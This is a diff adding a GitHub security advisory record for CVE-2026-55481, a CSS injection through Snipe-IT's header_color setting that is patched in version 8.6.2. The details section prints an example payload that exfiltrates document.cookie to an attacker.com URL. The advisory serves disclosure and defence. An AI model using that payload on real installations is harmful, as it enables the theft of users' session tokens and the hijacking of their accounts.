@@ -1,0 +1,76 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-w7qw-5wfv-gwx9",
+  "modified": "2026-08-28T18:04:29Z",
+  "published": "2026-08-28T18:04:29Z",
+  "aliases": [
+    "CVE-2026-55481"
+  ],
+  "summary": "Snipe-IT has CSS Injection via `header_color` Setting",
+  "details": "### Impact\n\nBecause `default.blade.php` is the base layout loaded on every authenticated page, all active user sessions are affected immediately upon the next page load after the payload is saved. An attacker who has compromised an admin account (or who is a malicious insider) can use this to silently exfiltrate session tokens from all other users, including other administrators.\n\nAdditionally, the Content Security Policy is disabled by default in Snipe-IT installations, which removes the primary browser-level mitigation for this class of attack.\n\n\n### Details\nThe `header_color` setting (and related color settings such as `nav_color` and `link_color`) is rendered inside a CSS `<style>` block using Laravel's `{{ }}` syntax:\n\n```\n--main-theme-color: {{ $snipeSettings->header_color ?? '#3c8dbc' }};\n```\n\nAlthough `{{ }}` applies HTML entity encoding, this is insufficient in a CSS context. An attacker with superadmin access to the `Settings > Branding` page can inject arbitrary CSS by setting the `header_color` value to something like:\n\n```\n    #fff; } body { background: url('[https://attacker.com/exfil?c='+document.cookie](https://attacker.com/exfil?c=%27+document.cookie)); } .x {\n```\n\nThis breaks out of the CSS property value and injects a new rule that executes in the context of every authenticated user's browser on every page load.\n\n### Patches\nPatched in https://github.com/grokability/snipe-it/pull/19097\n\n### Workarounds\nEnable CSP in your .env file.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "snipe/snipe-it"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "8.6.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 8.6.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/security/advisories/GHSA-w7qw-5wfv-gwx9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55481"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/pull/19097"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/commit/c31190a128ec96fb34000a2f27eae198b1a51d40"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/grokability/snipe-it"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/grokability/snipe-it/releases/tag/v8.6.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-08-28T18:04:29Z",
+    "nvd_published_at": "2026-07-10T20:16:47Z"
+  }
+}
